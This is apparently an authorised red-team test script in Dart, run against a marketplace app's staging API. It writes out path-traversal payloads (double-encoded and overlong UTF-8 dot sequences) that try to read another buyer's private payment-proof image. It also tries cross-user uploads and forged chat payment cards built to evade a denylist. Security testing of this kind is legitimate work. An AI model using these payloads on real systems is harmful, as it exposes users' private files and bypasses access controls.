/// REDTEAM_BLIND_BY_CHAT_POS_BRBW_v1 — pass2. Staging only. No fixes.
import 'dart:convert';
import 'dart:io';

import '_rtby.dart';

Future<void> main() async {
  final c = Rtby.fromEnv(loadEnv());
  await c.loginActors();
  await c.ensureBuyer2();

  const chatId = 'edb67d60-6e7f-4fee-8b69-44e9b69721a7';
  const oidA = '52db2fa8-47d3-481c-85b5-de3b93380b63';
  const oidB = 'c548838a-e478-4d67-9774-7e534926ceb8';
  const paidChat = 'bf654459-f8b5-4899-8bec-38c0eaafd820';
  const liveId = '9e5dccf3-28fd-4807-9091-decc31ebecb5';
  const proofA =
      'order_proofs/bfcbeeee-7dc1-4cd1-b2a7-d3a0a6cf7c96/52db2fa8-47d3-481c-85b5-de3b93380b63/rtby_a.png';
  const proofB =
      'order_proofs/bfcbeeee-7dc1-4cd1-b2a7-d3a0a6cf7c96/c548838a-e478-4d67-9774-7e534926ceb8/rtby_b.png';

  Future<void> tryCard(String id, String lens, Map<String, Object?> payload,
      {String? title, String severity = 'P2'}) async {
    final h = await c.postMsg(chatId: chatId, text: jsonCard(payload));
    if (h.ok && h.firstId != null) {
      c.hold(
        id: id,
        lens: lens,
        severity: severity,
        title: title ?? id,
        actor: 'buyer JWT',
        pre: 'pass2',
        repro: 'POST ${jsonEncode(payload)}',
        expected: 'denied',
        obtained: h.brief,
        evidence: {'id': h.firstId, 'payload': payload},
      );
    } else {
      c.block(id, lens, 'recusado', h.brief);
    }
  }

  // seller vê Skrill notes + encoding Clearpay + seguro
  for (final e in {
    '1461': 'skrill-notes',
    '1485': 'isss-clearpay',
    '1486': 'cgj-clearpay',
    '1471': 'seguro-skrill',
    '1497': 'double-enc-url',
    '1498': 'e080ae-url',
  }.entries) {
    final jwt = e.key == '1471' ? c.sellerJwt : c.sellerJwt;
    final h = await c.rest(
      'GET',
      'chat_messages?id=eq.${e.key}&select=id,text',
      jwt: jwt,
    );
    c.note('P2.seller-${e.value}', 'seller GET ${e.key}', h.brief, lens: 'BY1');
  }

  final inbox = await c.chatRow(chatId);
  c.note('P2.inbox-now', 'last_message actual', inbox?['last_message'],
      lens: 'BY5');

  // %c1%9c SEM ASCII ".." (pass1 tinha %c1%9c../ e o guard apanhou ..)
  await tryCard(
    'P2.c19c-no-ascii-dots',
    'BY4',
    {
      'kind': 'reservation_payment_submitted',
      'order_id': oidA,
      'notes': 'ok',
      'proof_url':
          '$stagingHost/storage/v1/object/fleaber_private/order_proofs/${c.buyerId}/$oidA/%c1%9c%c1%9c/%c1%9c%c1%9c/order_proofs/${c.buyerId}/$oidB/rtby_b.png',
    },
    title: 'proof_url %c1%9c%c1%9c sem ASCII ..',
  );

  await tryCard(
    'P2.c19c-plus-e080ae',
    'BY4',
    {
      'kind': 'reservation_payment_submitted',
      'order_id': oidA,
      'notes': 'ok',
      'proof_url':
          '$stagingHost/storage/v1/object/fleaber_private/order_proofs/${c.buyerId}/$oidA/%c1%9c%e0%80%ae%e0%80%ae/%c1%9c%e0%80%ae%e0%80%ae/order_proofs/${c.buyerId}/$oidB/rtby_b.png',
    },
    title: 'proof_url %c1%9c + %e0%80%ae (backslash + overlong dots)',
  );

  // GET loot double-encoding / e080ae / c19c
  Future<void> loot(String id, String path) async {
    final h = await c.req('GET', path, jwt: c.buyerJwt);
    c.note(id, 'GET', '${h.status} len=${h.body.length} ${h.snippet}',
        lens: 'BY4');
    final png = h.ok && h.body.length >= 24;
    if (png) {
      c.hold(
        id: '$id-loot',
        lens: 'BY4',
        severity: 'P1',
        title: 'GET loot PNG via path hostil',
        actor: 'buyer JWT',
        pre: 'prova B existe',
        repro: 'GET $path',
        expected: '400/404',
        obtained: '${h.status} len=${h.body.length}',
      );
    }
  }

  await loot(
    'P2.loot-double',
    '/storage/v1/object/authenticated/fleaber_private/order_proofs/${c.buyerId}/$oidA/%252e%252e/%252e%252e/order_proofs/${c.buyerId}/$oidB/rtby_b.png',
  );
  await loot(
    'P2.loot-e080ae',
    '/storage/v1/object/authenticated/fleaber_private/order_proofs/${c.buyerId}/$oidA/%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/order_proofs/${c.buyerId}/$oidB/rtby_b.png',
  );
  await loot(
    'P2.loot-c19c',
    '/storage/v1/object/authenticated/fleaber_private/order_proofs/${c.buyerId}/$oidA/%c1%9c%c1%9c/%c1%9c%c1%9c/order_proofs/${c.buyerId}/$oidB/rtby_b.png',
  );
  await loot(
    'P2.loot-c19c-e080ae',
    '/storage/v1/object/authenticated/fleaber_private/order_proofs/${c.buyerId}/$oidA/%c1%9c%e0%80%ae%e0%80%ae/%c1%9c%e0%80%ae%e0%80%ae/order_proofs/${c.buyerId}/$oidB/rtby_b.png',
  );

  final honest = await c.req(
    'GET',
    '/storage/v1/object/authenticated/fleaber_private/$proofB',
    jwt: c.buyerJwt,
  );
  c.note('P2.honest-b', 'GET prova B', '${honest.status} len=${honest.body.length}',
      lens: 'BY6');

  // B2 upload PNG (pass1 415 octet-stream)
  final upB2 = await c.req(
    'POST',
    '/storage/v1/object/fleaber_private/$proofA',
    jwt: c.buyer2Jwt,
    rawBytes: png1x1,
    contentType: 'image/png',
    extra: {'x-upsert': 'true'},
  );
  if (upB2.ok) {
    c.hold(
      id: 'P2.upload-cross-user',
      lens: 'BY6',
      severity: 'P1',
      title: 'B2 upload PNG no prefixo B1',
      actor: 'buyer2 JWT',
      pre: 'policy insert_own',
      repro: 'POST image/png order_proofs/{B1}/…',
      expected: '403',
      obtained: upB2.brief,
    );
  } else {
    c.block('P2.upload-cross-user', 'BY6', 'upload B2 recusado', upB2.brief);
  }

  final getB2 = await c.req(
    'GET',
    '/storage/v1/object/authenticated/fleaber_private/$proofA',
    jwt: c.buyer2Jwt,
  );
  if (getB2.ok && getB2.body.length >= 8) {
    c.hold(
      id: 'P2.get-cross-user',
      lens: 'BY6',
      severity: 'P1',
      title: 'B2 lê prova B1',
      actor: 'buyer2 JWT',
      pre: 'PNG A existe',
      repro: 'GET authenticated $proofA',
      expected: '403/404',
      obtained: '${getB2.status} len=${getB2.body.length}',
    );
  } else {
    c.block('P2.get-cross-user', 'BY6', 'GET B2 recusado',
        '${getB2.status} ${getB2.snippet}');
  }

  final live = await c.rest(
    'GET',
    'lives?id=eq.$liveId&select=id,status,is_active',
    service: true,
  );
  final liveMap = live.map ?? {};
  if ('${liveMap['status']}' != 'ended' || liveMap['is_active'] == true) {
    await c.rest(
      'PATCH',
      'lives?id=eq.$liveId',
      service: true,
      body: {'status': 'ended', 'is_active': false},
      prefer: 'return=minimal',
    );
    c.note('P2.end-live', 'force end', live.brief, lens: 'BY8');
  } else {
    c.note('P2.live-ended', 'live já ended', live.brief, lens: 'BY8');
  }

  // saturacao: mais um rail extra (PaySafe / Perfect Money) — mesma classe
  await tryCard(
    'P2.notes-perfectmoney',
    'BY1',
    {
      'kind': 'reservation_payment_submitted',
      'order_id': oidA,
      'notes': 'Perfect Money 12,00 €',
    },
    title: 'notes Perfect Money (mesma classe off-denylist)',
    severity: 'P1',
  );

  final out = {
    'auditor': 'REDTEAM_BLIND_BY_CHAT_POS_BRBW_v1',
    'pass': 2,
    'findings': c.findings,
    'blocked': c.blocked,
    'notes': c.notes,
    'lenses': c.lensesHit.toList()..sort(),
    'paid_chat': paidChat,
  };
  await dumpJson('${outDir()}/pass2.json', out);
  stdout.writeln(
      'PASS2 FINDINGS=${c.findings.length} BLOCKED=${c.blocked.length}');
}
